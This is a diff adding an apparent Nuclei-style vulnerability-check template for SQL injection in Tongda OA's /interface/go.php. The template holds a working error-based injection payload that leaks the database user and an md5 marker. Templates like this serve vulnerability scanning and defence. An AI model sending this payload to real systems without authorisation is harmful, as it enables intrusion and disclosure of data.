@@ -1,0 +1,27 @@
+id: poc-yaml-tongda-interface-go-sqli
+info:
+  name: 通达OA /go.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 通达OA /interface/go.php.
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - raw:
+      - |
+        GET /interface/go.php?APP_UNIT=a%2527+and+1%3d(select+1+from(select+count(*),concat(md5({{t1}}),0x7c,user(),0x7c,floor(rand(0)*2))x+from+information_schema.tables+group+by+x+limit+0,1)a)+and+%25271%2527=%25271 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, t2)
+          - contains(body, '错误')
+          - contains(body, '请联系管理员')
